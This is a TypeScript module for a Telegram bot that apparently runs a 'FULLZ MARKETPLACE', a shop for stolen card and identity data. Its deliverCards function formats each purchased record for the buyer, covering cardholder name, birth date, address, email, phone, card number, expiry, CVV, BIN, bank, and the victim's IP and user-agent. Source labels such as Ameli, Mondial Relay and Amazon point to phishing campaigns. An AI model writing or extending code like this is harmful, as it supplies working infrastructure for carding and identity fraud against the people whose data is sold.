import { bot } from '../bot'

const STATUS_MESSAGES: Record<string, (orderId: number, total?: number) => string> = {
  CONFIRMED: (id, total) => `✅ Commande #${id} confirmée ! Total: €${total?.toFixed(2) ?? '?'}`,
  PREPARING: (id) => `👨‍🍳 Votre commande #${id} est en préparation`,
  DELIVERING: (id) => `🚚 Votre commande #${id} est en livraison !`,
  DELIVERED: (id) => `✅ Commande #${id} livrée ! Merci pour votre confiance 🌸`,
  CANCELLED: (id) => `❌ Commande #${id} annulée`,
}

export interface CardDelivery {
  productName: string
  data: string
  meta?: {
    bin?: string
    bank?: string
    network?: string
    level?: string
    type?: string
    device?: string
    source?: string
    ddn?: string
    age?: string
    cp?: string
    ua?: string
  }
}

function escHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

function section(title: string, fields: Array<[string, string | undefined]>): string {
  const filled = fields.filter(([, v]) => v)
  if (!filled.length) return ''
  const rows = filled.map(([label, val], i) => {
    const branch = i === filled.length - 1 ? '┗' : '┣'
    return `${branch} ${label}: ${escHtml(val!)}`
  })
  return `${title}\n${rows.join('\n')}`
}

const SOURCE_LABEL: Record<string, string> = {
  AMELI: 'Ameli',
  MONDIAL_RELAY: 'Mondial Relay',
  AMAZON: 'Amazon',
  OTHER: 'Autre',
}

function formatCardBlock(c: CardDelivery, idx: number): string {
  const m = c.meta ?? {}

  // Try to parse fullData as JSON for structured fields
  let d: Record<string, string> = {}
  try { d = JSON.parse(c.data) } catch {}
  const isJson = Object.keys(d).length > 0

  const parts: string[] = []

  parts.push(`🛍️ <b>Carte ${idx + 1} — ${escHtml(c.productName)}</b>`)

  // Billing
  if (isJson) {
    const billing = section('🥽 <b>Billing</b>', [
      ['👤 Nom Complet', d.nom ?? d.titulaire],
      ['🎂 Date de Naissance', d.ddn ?? m.ddn],
      ['🏙️ Ville', d.ville],
      ['🏙️ Adresse', d.adresse],
      ['🏙️ Code Postal', d.cp ?? m.cp],
      ['📧 Email', d.email],
      ['📞 Téléphone', d.telephone],
    ])
    if (billing) parts.push(billing)

    // Carte
    const carte = section('💳 <b>Carte</b>', [
      ['🧾 Titulaire', d.titulaire ?? d.nom],
      ['💳 Numéro', d.numero],
      ['🕑 Expiration', d.expiration],
      ['🔒 CVV', d.cvv],
    ])
    if (carte) parts.push(carte)
  } else {
    // Fallback: raw data block
    parts.push(`💳 <b>Données</b>\n<code>${escHtml(c.data)}</code>`)
  }

  // Infos carte — données par-carte > meta produit
  const bin = d.bin ?? m.bin
  const bank = d.bank ?? m.bank
  const type = d.type ?? m.type
  const network = d.network ?? m.network
  const level = d.level ?? m.level
  const niveau = [network, level].filter(Boolean).join(' ')
  const scanRaw = d.scan ?? (bin ? `cardimages.imaginecurve.com/cards/${bin.slice(0, 6)}.png` : undefined)
  const scanHref = scanRaw ? (scanRaw.startsWith('http') ? scanRaw : `https://${scanRaw}`) : undefined
  const infos = section('🏦 <b>Infos carte</b>', [
    ['🟪 Bin', bin],
    ['🏦 Banque', bank],
    ['🏷️ Niveau', niveau || undefined],
    ['⚙️ Type', type],
    ['💠 Scan', scanHref ? `<a href="${scanHref}">${scanRaw}</a>` : undefined],
  ])
  if (infos) parts.push(infos)

  // Appareil — USER-AGENT par carte > device produit (fallback)
  const deviceFallback = m.device === 'IPHONE' ? 'iPhone'
    : m.device === 'ANDROID' ? 'Android'
    : m.device === 'UNKNOWN' ? 'Inconnu'
    : undefined
  const userAgent = (isJson ? d.ua : undefined) ?? m.ua ?? deviceFallback
  const appareil = section('💻 <b>Appareil</b>', [
    ['🌐 IP', isJson ? d.ip : undefined],
    ['🌟 USER-AGENT', userAgent],
  ])
  if (appareil) parts.push(appareil)

  // System / Source
  if (m.source) {
    parts.push(`🎨 <b>System</b>\n┗ 🏷️ Source: ${SOURCE_LABEL[m.source] ?? m.source}`)
  }

  // Shop tag
  parts.push(`\n<i>🔖 #FULLZ — Livré via FULLZ MARKETPLACE</i>`)

  return parts.join('\n\n')
}

export async function deliverCards(
  telegramId: string,
  orderId: number,
  cards: CardDelivery[]
): Promise<void> {
  if (cards.length === 0) return
  const divider = '\n\n━━━━━━━━━━━━━━━━━━━━\n\n'
  const header = `🃏 <b>Commande #${orderId} — Livraison</b>`
  const body = cards.map((c, i) => formatCardBlock(c, i)).join(divider)
  const message = `${header}\n\n━━━━━━━━━━━━━━━━━━━━\n\n${body}`
  try {
    await bot.api.sendMessage(telegramId, message, {
      parse_mode: 'HTML',
      link_preview_options: { is_disabled: true },
    } as any)
  } catch (err) {
    console.warn(`[deliver] Failed to send cards to ${telegramId}:`, err)
  }
}

export async function notify(telegramId: string, message: string): Promise<void> {
  try {
    await bot.api.sendMessage(telegramId, message)
  } catch (err) {
    console.warn(`[notify] Failed to send message to ${telegramId}:`, err)
  }
}

export async function notifyOrderStatus(
  telegramId: string,
  orderId: number,
  status: string,
  total?: number
): Promise<void> {
  const buildMessage = STATUS_MESSAGES[status]
  if (!buildMessage) return
  try {
    await bot.api.sendMessage(telegramId, buildMessage(orderId, total))
  } catch (err) {
    console.warn(`[notify] Failed to send message to ${telegramId}:`, err)
  }
}
